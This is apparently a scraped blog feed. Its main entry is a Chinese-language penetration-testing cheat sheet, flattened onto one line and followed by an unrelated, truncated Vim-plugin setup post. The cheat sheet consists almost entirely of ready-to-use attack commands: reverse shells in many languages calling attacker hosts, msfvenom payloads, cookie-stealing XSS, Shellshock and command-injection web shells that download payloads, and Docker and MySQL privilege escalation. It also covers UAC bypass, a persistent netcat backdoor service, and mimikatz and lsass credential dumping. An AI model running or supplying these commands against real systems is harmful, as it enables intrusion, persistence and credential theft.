-o payload.bin payload.asmnasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload 基于 CSV 文件查询 Exploit-DB1234567git clone https://github.com/offensive-security/exploit-database.gitcd exploit-database./searchsploit –u./searchsploit apache 2.2./searchsploit "Linux Kernel"cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep "&lt;|&lt;=" | sort -k3 shell使用 NC 在 Windows 上反弹 shell12345678c:&gt;nc -Lp 31337 -vv -e cmd.exenc 192.168.0.10 31337c:&gt;nc example.com 80 -e cmd.exenc -lp 80nc -lp 31337 -e /bin/bashnc 192.168.0.10 31337nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000 Python shell1python -c 'import pty;pty.spawn("/bin/bash")' Python\Ruby\PHP HTTP 服务器123456python2 -m SimpleHTTPServerpython3 -m http.serverruby -rwebrick -e "WEBrick::HTTPServer.new(:Port =&gt; 8888, :D ocumentRoot =&gt; Dir.pwd).start"php -S 0.0.0.0:8888 1234msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; X &gt; system.exemsfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 R &gt; exploit.phpmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -a x86 --platform win -f asp -o file.aspmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e x86/shikata_ga_nai -b "\x00" -a x86 --platform win -f c MSF 生成在 Linux 下反弹的 Meterpreter Shell1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -f elf -a x86 --platform linux -o shell MSF 生成反弹 Shell (C Shellcode)1msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b "\x00\x0a\x0d" -a x86 --platform win -f c MSF 生成反弹 Python Shell1msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py MSF 生成反弹 ASP Shell1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp -a x86 --platform win -o shell.asp MSF 生成反弹 Bash Shell1msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.sh MSF 生成反弹 PHP Shell123msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.phpadd &lt;?php at the beginningperl -i~ -0777pe's/^/&lt;?php \n/' shell.php MSF 生成反弹 Win Shell1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe -a x86 --platform win -o shell.exe BASH 反弹 Shell1234567891011121314151617bash -i &gt;&amp; /dev/tcp/X.X.X.X/443 0&gt;&amp;1exec /bin/bash 0&amp;0 2&gt;&amp;0exec /bin/bash 0&amp;0 2&gt;&amp;00&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;1960&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196exec 5&lt;&gt;/dev/tcp/attackerip/4444 cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; doneexec 5&lt;&gt;/dev/tcp/attackerip/4444cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or:while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done/bin/bash -i &gt; /dev/tcp/attackerip/8080 0&lt;&amp;1 2&gt;&amp;1/bin/bash -i &gt; /dev/tcp/X.X.X.X/443 0&lt;&amp;1 2&gt;&amp;1 PERL 反弹 Shell12345perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:443");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'# Win 平台perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;’ RUBY 反弹 Shell12345ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","443");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'# Win 平台ruby -rsocket -e 'c=TCPSocket.new("attackerip","443");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'ruby -rsocket -e 'f=TCPSocket.open("attackerip","443").to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)' PYTHON 反弹 Shell1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attackerip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' PHP 反弹 Shell1php -r '$sock=fsockopen("attackerip",443);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' JAVA 反弹 Shell123r = Runtime.getRuntime()p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/attackerip/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])p.waitFor() NETCAT 反弹 Shell12345678910nc -e /bin/sh attackerip 4444nc -e /bin/sh 192.168.37.10 443# 如果 -e 参数被禁用，可以尝试以下命令# mknod backpipe p &amp;&amp; nc attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe/bin/sh | nc attackerip 443rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4443 0/tmp/# 如果你安装错了 netcat 的版本，请尝试以下命令rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip &gt;/tmp/f TELNET 反弹 Shell12# 如果 netcat 不可用或者 /dev/tcpmknod backpipe p &amp;&amp; telnet attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe XTERM 反弹 Shell12345678910111213141516# http://baike.baidu.com/view/418628.htm# 开启 X 服务器 (:1 – 监听 TCP 端口 6001)apt-get install xnestXnest :1# 记得授权来自目标 IP 的连接xterm -display 127.0.0.1:1# 授权访问xhost +targetip# 在目标机器上连接回我们的 X 服务器xterm -display attackerip:1/usr/openwin/bin/xterm -display attackerip:1or$ DISPLAY=attackerip:0 xterm Windows 缓冲区溢出利用命令12msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b "\x00" -f cmsfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b "\x00" -f c COMMONLY USED BAD CHARACTERS:123456789101112131415161718192021\x00\x0a\x0d\x20 For http request\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c Ending with (0\n\r_)# 常用命令:pattern createpattern offset (EIP Address)pattern offset (ESP Address)add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )!pvefindaddr pattern_create 5000!pvefindaddr suggest!pvefindaddr modules!pvefindaddr nosafeseh!mona config -set workingfolder C:\Mona\%p!mona config -get workingfolder!mona mod!mona bytearray -b "\x00\x0a"!mona pc 5000!mona po EIP!mona suggest SEH – 结构化异常处理 SEH(“Structured Exception Handling”)，即结构化异常处理，是 windows 操作系统提供给程序设计者的强有力的处理程序错误或异常的武器。123456# https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH# http://baike.baidu.com/view/243131.htm!mona suggest!mona nosafesehnseh="\xeb\x06\x90\x90" (next seh chain)iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN) ROP (DEP) ROP(“Return-Oriented Programming”)是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。 123456789DEP(“Data Execution Prevention”)是一套软硬件技术，在内存上严格将代码和数据进行区分，防止数据当做代码执行。# https://en.wikipedia.org/wiki/Return-oriented_programming# https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B# https://en.wikipedia.org/wiki/Data_Execution_Prevention# http://baike.baidu.com/item/DEP/7694630!mona modules!mona ropfunc -m *.dll -cpb "\x00\x09\x0a"!mona rop -m *.dll -cpb "\x00\x09\x0a" (auto suggest) ##ASLR – 地址空间格局随机化 12# https://en.wikipedia.org/wiki/Address_space_layout_randomization# http://baike.baidu.com/view/3862310.htm ##寻蛋(EGG Hunter)技术 Egg hunting这种技术可以被归为“分级shellcode”，它主要可以支持你用一小段特制的shellcode来找到你的实际的（更大的）shellcode（我们的‘鸡蛋‘），原理就是通过在内存中搜索我们的最终shellcode。换句话说，一段短代码先执行，然后再去寻找真正的shellcode并执行。– 参考自看雪论坛，更多详情可以查阅我在代码注释中增加的链接。 12345678# https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/# http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf# http://www.fuzzysecurity.com/tutorials/expDev/4.html!mona jmp -r esp!mona egg -t lxxl\xeb\xc4 (jump backward -60)buff=lxxllxxl+shell!mona egg -t 'w00t' GDB Debugger 常用命令12345678910111213141516171819202122232425262728293031323334# 设置断点break *_start# 执行下一个命令nextstepns# 继续执行continuec# 数据checking 'REGISTERS' and 'MEMORY'# 显示寄存器的值: (Decimal,Binary,Hex)print /d –&gt; Decimalprint /t –&gt; Binaryprint /x –&gt; HexO/P :(gdb) print /d $eax$17 = 13(gdb) print /t $eax$18 = 1101(gdb) print /x $eax$19 = 0xd(gdb)# 显示特定内存地址的值command : x/nyz (Examine)n –&gt; Number of fields to display ==&gt;y –&gt; Format for output ==&gt; c (character) , d (decimal) , x (Hexadecimal)z –&gt; Size of field to be displayed ==&gt; b (byte) , h (halfword), w (word 32 Bit) XSS 备忘录123456789101112131415161718192021222324252627282930https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet("&lt; iframes &gt; src=http://IP:PORT &lt;/ iframes &gt;")&lt;script&gt;document.location=http://IP:PORT&lt;/script&gt;';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//–&gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;";!–"&lt;XSS&gt;=&amp;amp;amp;&#123;()&#125;&lt;IMG SRC="javascript:alert('XSS');"&gt;&lt;IMG SRC=javascript:alert('XSS')&gt;&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;""&gt;&lt;IMG SRC=&amp;amp;amp;#106;&amp;amp;amp;#97;&amp;amp;amp;#118;&amp;amp;amp;#97;&amp;amp;amp;#115;&amp;amp;amp;#99;&amp;amp;amp;#114;&amp;amp;amp;#105;&amp;amp;amp;#112;&amp;amp;amp;#116;&amp;amp;amp;#58;&amp;amp;amp;#97;&amp;amp;amp;#108;&amp;amp;amp;#101;&amp;amp;amp;#114;&amp;amp;amp;#116;&amp;amp;amp;#40;&amp;amp;amp;#39;&amp;amp;amp;#88;&amp;amp;amp;#83;&amp;amp;amp;#83;&amp;amp;amp;#39;&amp;amp;amp;#41;&gt;&lt;IMG SRC=&amp;amp;amp;#0000106&amp;amp;amp;#0000097&amp;amp;amp;#0000118&amp;amp;amp;#0000097&amp;amp;amp;#0000115&amp;amp;amp;#0000099&amp;amp;amp;#0000114&amp;amp;amp;#0000105&amp;amp;amp;#0000112&amp;amp;amp;#0000116&amp;amp;amp;#0000058&amp;amp;amp;#0000097&amp;amp;amp;#0000108&amp;amp;amp;#0000101&amp;amp;amp;#0000114&amp;amp;amp;#0000116&amp;amp;amp;#0000040&amp;amp;amp;#0000039&amp;amp;amp;#0000088&amp;amp;amp;#0000083&amp;amp;amp;#0000083&amp;amp;amp;#0000039&amp;amp;amp;#0000041&gt;&lt;IMG SRC="jav ascript:alert('XSS');"&gt;perl -e 'print "&lt;IMG SRC=javascript:alert(\"XSS\")&gt;";' &gt; out&lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;("&gt;&lt; iframes http://google.com &lt; iframes &gt;)&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert('XSS');"&gt;&lt;/FRAMESET&gt;"&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;%253cscript%253ealert(document.cookie)%253c/script%253e"&gt;&lt;s"%2b"cript&gt;alert(document.cookie)&lt;/script&gt;%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)'%3E&lt;img src=asdf onerror=alert(document.cookie)&gt; SSH Over SCTP (使用 Socat)1234567891011# 远端服务器# 假设你准备让 SCTP socket 监听端口 80/SCTP 并且 sshd 端口在 22/TCP$ socat SCTP-LISTEN:80,fork TCP:localhost:22# 本地端# 将 SERVER_IP 换成远端服务器的地址，然后将 80 换成 SCTP 监听的端口号$ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80# 创建 socks 代理# 替换 username 和 -p 的端口号$ ssh -lusername localhost -D 8080 -p 1337 使用洋葱网络12345678910111213141516171819# 安装服务$ apt-get install tor torsocks# 绑定 ssh 到 tor 服务端口 80# /etc/tor/torrcSocksPolicy accept 127.0.0.1SocksPolicy accept 192.168.0.0/16Log notice file /var/log/tor/notices.logRunAsDaemon 1HiddenServiceDir /var/lib/tor/ssh_hidden_service/HiddenServicePort 80 127.0.0.1:22PublishServerDescriptor 0$ /etc/init.d/tor start$ cat /var/lib/tor/ssh_hidden_service/hostname3l5zstvt1zk5jhl662.onion# ssh 客户端连接$ apt-get install torsocks$ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80 Metagoofil – 元数据收集工具 Metagoofil 是一款利用Google收集信息的工具。 123# http://www.edge-security.com/metagoofil.php# 它可以自动在搜素引擎中检索和分析文件，还具有提供Mac地址，用户名列表等其他功能$ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html 利用 Shellshock12345678910111213# 一个发现并利用服务器 Shellshock 的工具# https://github.com/nccgroup/shocker$ ./shocker.py -H 192.168.56.118 --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose# 查看文件$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; echo \$(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80# 绑定 shell$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80# 反弹 Shell$ nc -l -p 443$ echo "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80 获取 Docker 的 Root12345678910111213141516171819202122232425262728# 获取 Docker 的 Root# user 必须在 docker 用户组中ek@victum:~/docker-test$ iduid=1001(ek) gid=1001(ek) groups=1001(ek),114(docker)ek@victum:~$ mkdir docker-testek@victum:~$ cd docker-testek@victum:~$ cat &gt; DockerfileFROM debian:wheezyENV WORKDIR /stuffRUN mkdir -p $WORKDIRVOLUME [ $WORKDIR ]WORKDIR $WORKDIR&lt;&lt; EOFek@victum:~$ docker build -t my-docker-image .ek@victum:~$ docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c \'cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh'./shwhoami# rootek@victum:~$ docker run -v /etc:/stuff -t my-docker-image /bin/sh -c 'cat /stuff/shadow' 使用 DNS 隧道绕过防火墙12345678910111213141516171819202122232425# 让数据和命令使用 DNS 隧道传输以绕过防火墙的检查# dnscat2 支持从目标主机上面上传和下载命令来获取文件、数据和程序# 服务器 (攻击者)$ apt-get update$ apt-get -y install ruby-dev git make g++$ gem install bundler$ git clone https://github.com/iagox86/dnscat2.git$ cd dnscat2/server$ bundle install$ ruby ./dnscat2.rbdnscat2&gt; New session established: 16059dnscat2&gt; session -i 16059# 客户机 (目标)# https://downloads.skullsecurity.org/dnscat2/# https://github.com/lukebaggett/dnscat2-powershell$ dnscat --host &lt;dnscat server_ip&gt;编译 Assemble 代码$ nasm -f elf32 simple32.asm -o simple32.o$ ld -m elf_i386 simple32.o simple32$ nasm -f elf64 simple.asm -o simple.o$ ld simple.o -o simple 使用非交互 Shell 打入内网1234567891011121314# 生成 shell 使用的 ssh 密钥$ wget -O - -q "http://domain.tk/sh.php?cmd=whoami"$ wget -O - -q "http://domain.tk/sh.php?cmd=ssh-keygen -f /tmp/id_rsa -N \"\" "$ wget -O - -q "http://domain.tk/sh.php?cmd=cat /tmp/id_rsa"# 增加用户 tempuser $ useradd -m tempuser$ mkdir /home/tempuser/.ssh &amp;&amp; chmod 700 /home/tempuser/.ssh$ wget -O - -q "http://domain.tk/sh.php?cmd=cat /tmp/id_rsa" &gt; /home/tempuser/.ssh/authorized_keys$ chmod 700 /home/tempuser/.ssh/authorized_keys$ chown -R tempuser:tempuser /home/tempuser/.ssh# 反弹 ssh shell$ wget -O - -q "http://domain.tk/sh.php?cmd=ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f tempuser@&lt;attacker_ip&gt;" 利用 POST 远程命令执行获取 Shell123456789101112attacker:~$ curl -i -s -k -X 'POST' --data-binary $'IP=%3Bwhoami&amp;submit=submit' 'http://victum.tk/command.php'attacker:~$ curl -i -s -k -X 'POST' --data-binary $'IP=%3Becho+%27%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%27+%3E+..%2Fshell.php&amp;submit=submit' 'http://victum.tk/command.php'attacker:~$ curl http://victum.tk/shell.php?cmd=id# 在服务器上下载 shell (phpshell.php)http://victum.tk/shell.php?cmd=php%20-r%20%27file_put_contents%28%22phpshell.php%22,%20fopen%28%22http://attacker.tk/phpshell.txt%22,%20%27r%27%29%29;%27# 运行 nc 并执行 phpshell.phpattacker:~$ nc -nvlp 1337 以管理员身份在 Win7 上反弹具有系统权限的 Shell12345678910111213141516171819202122232425262728293031323334353637383940414243msfvenom –p windows/shell_reverse_tcp LHOST=192.168.56.102 –f exe &gt; danger.exe# 显示账户配置net user &lt;login&gt;# Kali 上下载 psexechttps://technet.microsoft.com/en-us/sysinternals/bb897553.aspx# 使用 powershell 脚本上传 psexec.exe 到目标机器echo $client = New-Object System.Net.WebClient &gt; script.ps1echo $targetlocation = "http://192.168.56.102/PsExec.exe" &gt;&gt; script.ps1echo $client.DownloadFile($targetlocation,"psexec.exe") &gt;&gt; script.ps1powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1# 使用 powershell 脚本上传 danger.exe 到目标机器echo $client = New-Object System.Net.WebClient &gt; script2.ps1echo $targetlocation = "http://192.168.56.102/danger.exe" &gt;&gt; script2.ps1echo $client.DownloadFile($targetlocation,"danger.exe") &gt;&gt; script2.ps1powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1# 使用预编译的二进制文件绕过 UAC:https://github.com/hfiref0x/UACME# 使用 powershell 脚本上传 https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe 到目标机器echo $client = New-Object System.Net.WebClient &gt; script2.ps1echo $targetlocation = "http://192.168.56.102/Akagi64.exe" &gt;&gt; script3.ps1echo $client.DownloadFile($targetlocation,"Akagi64.exe") &gt;&gt; script3.ps1powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1# 在 Kali 上创建监听nc -lvp 4444# 以系统权限使用 Akagi64 运行 danger.exe Akagi64.exe 1 C:\Users\User\Desktop\danger.exe# 在 Kali 上创建监听nc -lvp 4444# 下一步就会反弹给我们一个提过权的 shell# 以系统权限使用 PsExec 运行 danger.exe psexec.exe –i –d –accepteula –s danger.exe 以普通用户身份在 Win7 上反弹具有系统权限的 Shell12345678910111213141516171819202122232425262728293031323334https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx #ms15-051https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.htmlhttps://www.exploit-db.com/exploits/37049/# 查找目标机器是否安装了补丁，输入如下命令wmic qfe getwmic qfe | find "3057191"# 上传编译后的利用程序并运行它https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe# 默认情况下其会以系统权限执行 cmd.exe，但我们需要改变源代码以运行我们上传的 danger.exe# https://github.com/hfiref0x/CVE-2015-1701 下载它并定位到 "main.c"# 使用 wce.exe 获取已登录用户的明文账号密码http://www.ampliasecurity.com/research/windows-credentials-editor/wce -w# 使用 pwdump7 获取其他用户的密码哈希值http://www.heise.de/download/pwdump.html# we can try online hash cracking tools such crackstation.netMS08-067 – 不使用 Metasploit$ nmap -v -p 139, 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.31.205$ searchsploit ms08-067$ python /usr/share/exploitdb/platforms/windows/remote/7132.py 192.168.31.205 1 通过 MySQL Root 账户实现提权12345678910111213141516171819# Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)$ wget 0xdeadbeef.info/exploits/raptor_udf2.c$ gcc -g -c raptor_udf2.c$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lcmysql -u root -pmysql&gt; use mysql;mysql&gt; create table foo(line blob);mysql&gt; insert into foo values(load_file('/home/user/raptor_udf2.so'));mysql&gt; select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';mysql&gt; create function do_system returns integer soname 'raptor_udf2.so';mysql&gt; select * from mysql.func;mysql&gt; select do_system('echo "root:passwd" | chpasswd &gt; /tmp/out; chown user:user /tmp/out');user:~$ su -Password:user:~# whoamirootroot:~# iduid=0(root) gid=0(root) groups=0(root) 使用 LD_PRELOAD 注入程序123$ wget https://github.com/jivoi/pentest/ldpreload_shell.c$ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so$ sudo -u user LD_PRELOAD=/tmp/ldpreload_shell.so /usr/local/bin/somesoft 针对 OpenSSH 用户进行枚举时序攻击 枚举时序攻击(“Enumeration Timing Attack”)属于侧信道攻击/旁路攻击(Side Channel Attack)，侧信道攻击是指利用信道外的信息，比如加解密的速度/加解密时芯片引脚的电压/密文传输的流量和途径等进行攻击的方式，一个词形容就是“旁敲侧击”。–参考自 shotgun 在知乎上的解释。osueta 是一个用于对 OpenSSH 进行时序攻击的 python2 脚本，其可以利用时序攻击枚举 OpenSSH 用户名，并在一定条件下可以对 OpenSSH 服务器进行 DOS 攻击。 123# https://github.com/c0r3dump3d/osueta$ ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v yes$ ./osueta.py -H 192.168.10.22 -p 22 -d 15 -v yes –dos no -L userfile.txt 使用 ReDuh 构造合法的 HTTP 请求以建立 TCP 通道 ReDuh 是一个通过 HTTP 协议建立隧道传输各种其他数据的工具。其可以把内网服务器的端口通过 http/https 隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。 123456789101112131415161718192021# https://github.com/sensepost/reDuh# 步骤 1# 上传 reDuh.jsp 目标服务器$ http://192.168.10.50/uploads/reDuh.jsp# 步骤 2# 在本机运行 reDuhClient $ java -jar reDuhClient.jar http://192.168.10.50/uploads/reDuh.jsp# 步骤 3# 使用 nc 连接管理端口$ nc -nvv 127.0.0.1 1010# 步骤 4# 使用隧道转发本地端口到远程目标端口[createTunnel] 7777:172.16.0.4:3389# 步骤 5# 使用 RDP 连接远程$ /usr/bin/rdesktop -g 1024x768 -P -z -x l -k en-us -r sound:off localhost:7777 Linux 常用安全命令1234567891011121314151617181920212223242526272829303132333435363738394041# 使用 uid 查找对应的程序find / -uid 0 -perm -4000# 查找哪里拥有写权限find / -perm -o=w# 查找名称中包含点和空格的文件find / -name " " -printfind / -name ".." -printfind / -name ". " -printfind / -name " " -print# 查找不属于任何人的文件find / -nouser# 查找未链接的文件lsof +L1# 获取进程打开端口的信息lsof -i# 看看 ARP 表中是否有奇怪的东西arp -a# 查看所有账户getent passwd# 查看所有用户组getent group# 列举所有用户的 crontabsfor user in $(getent passwd|cut -f1 -d:); do echo "### Crontabs for $user ####"; crontab -u $user -l; done# 生成随机密码cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&amp;*()_+&#123;&#125;|:&lt;&gt;?=’|fold -w 12| head -n 4# 查找所有不可修改的文件find . | xargs -I file lsattr -a file 2&gt;/dev/null | grep ‘^….i’# 使文件不可修改chattr -i file 实用的 Windows cmd 命令1234567891011net localgroup Usersnet localgroup Administratorssearch dir/s *.docsystem("start cmd.exe /k $cmd")sc create microsoft_update binpath="cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe" start= auto error= ignore/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"Procdump.exe -accepteula -ma lsass.exe lsass.dmpmimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32 位系统C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64 位系统]]></content>
      <categories>
        <category>Sec</category>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[自定义VIM插件为IDE利器]]></title>
    <url>%2F2016%2F12%2F21%2Fvim-plugin%2F</url>
    <content type="text"><![CDATA[如图是VIM自定义插件及配置后的演示，虽然有Pycharm但是算不上轻量级，写个运维小脚本根本用不到，一般笔者只有在写Django或读python项目源码的时候会用，so我们开始吧 1. 安装插件管理工具Vundle1git clone https://github.com/gmarik/vundle.git ~/.vim/bundle/vundle 编辑文件~/.vimrc 123456789101112131415set nocompatible " be iMprovedfiletype off " required!set rtp+=~/.vim/bundle/vundle/call vundle#rc()"my Bundle here:Bundle 'Valloric/YouCompleteMe' "代码补全Plugin 'Yggdroot/indentLine' "垂直对齐线Plugin 'Chiel92/vim-autoformat' "自动语法缩进filetype plugin indent on" hot key 修改完成后命令行执行 vim +PluginInstall +qall 等待安装完成，执行vim +BundleInstall +qall 下载Valloric/YouCompleteMe包（可能久些） 2. 编译安装YouCompleteMe安装编译所需软件： 12sudo apt-get install build-essential cmakesudo apt-get install python-dev python3-dev 可选编译支持代码补全1. 编译具有对C系列语言支持的YCM： 12cd ~/.vim/bundle/YouCompleteMe./install.py --clang-completer 2. 编译YCM没有C语言的支持： 12cd ~/.vim/bundle/YouCompleteMe./install.py 3. 编译所有支持的语言： 12cd ~/.vim/bundle/YouCompleteMe./install.py --all 脚本会自动下载所需包，笔者选择的是编译所有支持语言全部下来大小在400MB左右 3. 报错解决报错如下： 1YouCompleteMe unavailable: requires Vim compiled with Python 2.x support 原因： 执行vim --version|grep python 12-python-python3 vim编译安装的时候默认没有支持Python 解决： 在Debian中sudo apt-get install vim-nox 在Ubuntu中sudo apt-get install vim-gnome-py2 其他Linux发行版中如果没有上述软件包，需要重新下载vim源码重新编译，加选项--enable-python3interp=yes 更多解决方案：stackoverflow 只有个别发行版中Vim会不编译支持Python 附加： python交互模式中代码自动补全，及笔者.vimrc配置文件家目录写入.pythontab文件 vim ~/.pythontab 12345678910111213141516171819# python startup file# -*- coding: utf8 -*-import sysimport readlineimport rlcompleterimport atexitimport os# tab completionreadline.parse_and_bind('tab: complete') #tab键可自定义# history filehistfile = os.path.join(os.environ['HOME'], '.pythonhistory')try: readline.read_history_file(histfile)except IOError: passatexit.register(readline.write_history_file, histfile)del os, histfile, readline, rlcompleter chmod +x .pythontab 编辑~/.bashrc文件加入环境变量 1echo "export PYTHONSTARTUP=~/.pythontab" &gt;&gt; ~/.bashrc &amp;&amp; source ~/.bashrc 测试： 双击tab键补全,可更改在~/.pythontab文件中有做注释 123456789101112kionf@kionf-pc[18:23]~:$ pythonPython 2.7.12+ (default, Aug 4 2016, 20:04:34) [GCC 6.1.1 20160724] on linux2Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; import random&gt;&gt;&gt; random.random.BPF random.__reduce__( random.betavariate(random.LOG4 random.__reduce_ex__( random.choice(random.NV_MAGICCONST random.__repr__( random.division..........................................................................random.__package__ random._warn( &gt;&gt;&gt; random. .vimrc配置文件 12345678910111213141516171819202122232425set nocompatible " be iMprovedset tabstop=4 "tab键为4个空格set shiftwidth=4set expandtabset nu "显示行号，复制的时候可以:set nu!来取消显示syntax onfiletype off " required!set rtp+=~/.vim/bundle/vundle/call vundle#rc()"my Bundle here:Bundle 'Valloric/YouCompleteMe'Plugin 